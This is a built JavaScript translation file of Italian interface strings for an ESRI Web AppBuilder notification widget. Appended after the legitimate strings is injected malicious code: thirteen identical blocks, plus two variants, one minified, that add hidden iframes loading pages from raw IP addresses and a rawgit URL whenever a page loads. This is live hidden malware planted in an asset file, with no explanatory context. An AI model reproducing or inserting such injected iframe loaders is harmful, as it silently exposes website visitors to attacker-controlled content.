// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define({"widgets/PublicNotification/setting/nls/strings":{searchSourceSetting:{title:"Impostazioni buffer e di ricerca",mainHint:"\u00c8 possibile abilitare ricerche di testo di indirizzi features, digitalizzazione della geometria e buffering."},addressSourceSetting:{title:"Address Layers",mainHint:"\u00c8 possibile specificare quali sono i layer di etichetta destinatari disponibili."},notificationSetting:{title:"Opzioni di notifica",mainHint:"\u00c8 possibile specificare quali tipi di notifica sono disponibili."},
groupingLabels:{addressSources:"Layer da utilizzare per selezionare il layer di destinazione",averyStickersDetails:"Avery(r) stickers",csvDetails:"File (CSV) con valori separati da virgole",drawingTools:"Strumenti di disegno per una specifica area",featureLayerDetails:"Feature layer",geocoderDetails:"Geocodificatore",labelFormats:"Formati di etichetta disponibili",printingOptions:"Opzioni per pagine di etichetta stampate",searchSources:"Fonti di ricerca",stickerFormatDetails:"Parametri pagina etichetta"},
hints:{alignmentAids:"Segni aggiunti alla pagina etichetta per consentire di allineare la pagina con la stampante",csvNameList:"Un elenco di nomi di campi sensibili alle maiuscole e minuscole separati da virgole",horizontalGap:"Spazio tra due etichette in una riga",insetToLabel:"Spazio tra lato di etichetta e inizio del testo",labelFormatDescription:"In che modo lo stile dell'etichetta viene presentato nell\u2019elenco di opzioni del formato widget",labelFormatDescriptionHint:"Descrizione del comando per completare la descrizione nell'elenco delle opzioni del formato",
labelHeight:"Altezza di ciascuna etichetta nella pagina",labelWidth:"Larghezza di ciascuna etichetta nella pagina",localSearchRadius:"Specifica il raggio di un'area intorno al centro della mappa corrente che viene utilizzato per assegnare la priorit\u00e0 alla classificazione dei candidati geocodificati  in modo che i canditati pi\u00f9 vicini alla posizione vengano restituiti per primi",rasterResolution:"La risoluzione della schermata \u00e8 di circa 100 pixel per pollice. Quanto pi\u00f9 \u00e8 alta la risoluzione,tanto pi\u00f9 memoria del browser sar\u00e0 necessaria. I browser differiscono nella loro capacit\u00e0 di gestire abilmente richieste di grossa memoria.",
selectionListOfOptionsToDisplay:"Le voci selezionate sono visualizzate come opzioni nel widget; cambiare l\u2019ordine come desiderato",verticalGap:"Spazio tra due etichette in una colonna"},propertyLabels:{bufferDefaultDistance:"Distanza predefinita del buffer",bufferUnits:"Settare nel widget l'unit\u00e0 del buffer",countryRegionCodes:"Codici paesi o regioni",description:"Descrizione",descriptionHint:"Suggerimento descrizione",displayField:"Campo di visualizzazione",drawingToolsFreehandPolygon:"poligono a mano libera",
drawingToolsLine:"linea",drawingToolsPoint:"punto",drawingToolsPolygon:"poligono",drawingToolsPolyline:"polilinea",enableLocalSearch:"Abilita ricerca locale",exactMatch:"Corrispondenza esatta",fontSizeAlignmentNote:"Dimensione del carattere della nota sui margini di stampa",gridDarkness:"Grid darkness",gridlineLeftInset:"Left gridline inset",gridlineMajorTickMarksGap:"Major tick marks every",gridlineMinorTickMarksGap:"Minor tick marks every",gridlineRightInset:"Right gridline inset",labelBorderDarkness:"Label border darkness",
labelBottomEdge:"Margine inferiore delle etichette sulla pagina",labelFontSize:"Dimensione carattere",labelHeight:"Altezza etichetta",labelHorizontalGap:"Spazio orizzontale",labelInitialInset:"Inserto per il testo dell'etichetta",labelLeftEdge:"Margine sinistro delle etichette sulla pagina",labelMaxLineCount:"Numero massimo di linee nell\u2019etichetta",labelPageHeight:"Altezza pagina",labelPageWidth:"Larghezza pagina",labelRightEdge:"Margine destro delle etichette sulla pagina",labelsInAColumn:"Numero di etichette in una colonna",
labelsInARow:"Numero di etichette in una riga",labelTopEdge:"Margine superiore delle etichette sulla pagina",labelVerticalGap:"Spazio verticale",labelWidth:"Larghezza etichetta",limitSearchToMapExtent:"Esegui la ricerca nell'estensione mappa corrente",maximumResults:"Risultati massimi",maximumSuggestions:"Suggerimenti massimi",minimumScale:"Scala minima",name:"Nome",percentBlack:"% nero",pixels:"pixel",pixelsPerInch:"pixel per pollice",placeholderText:"Testo segnaposto",placeholderTextForAllSources:"Testo segnaposto per la ricerca in tutte le origini",
radius:"Raggio",rasterResolution:"Risoluzione raster",searchFields:"Campi di ricerca",showAlignmentAids:"Mostra strumenti di allineamento sulla pagina",showGridTickMarks:"Mostra segni di spunta sulla griglia",showLabelOutlines:"Mostra i contorni dell'etichetta",showPopupForFoundItem:"Mostra il popup per la feature o per la posizione trovata",tool:"Strumenti",units:"Unit\u00e0",url:"URL",urlToGeometryService:"URL per il geometry service",useRelatedRecords:"Utilizza i record correlati",useSecondarySearchLayer:"Utilizza il layer di selezione secondario",
useVectorFonts:"Utilizza i font vettoriali (solo caratteri latini)",zoomScale:"Scala zoom"},buttons:{addAddressSource:"Aggiungi un layer contenente le etichette degli indirizzi nel relativo popup",addLabelFormat:"Aggiungi un formato etichetta",addSearchSource:"Aggiungi una origine di ricerca",set:"Imposta"},placeholders:{averyExample:"ad es., etichetta Avery(r) ${averyPartNumber}",countryRegionCodes:"ad es., USA,CHN",descriptionCSV:"Valori separati da virgola",descriptionPDF:"Etichetta PDF ${heightLabelIn} x ${widthLabelIn} pollici; ${labelsPerPage} per pagina"},
tooltips:{getWebmapFeatureLayer:"Ricevi feature layer dalla webmap",openCountryCodes:"Clicca per ricevere maggiori informazioni sui codici",openFieldSelector:"Clicca per aprire un selettore di campi",setAndValidateURL:"Imposta e convalida URL"},_localized:{}}});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});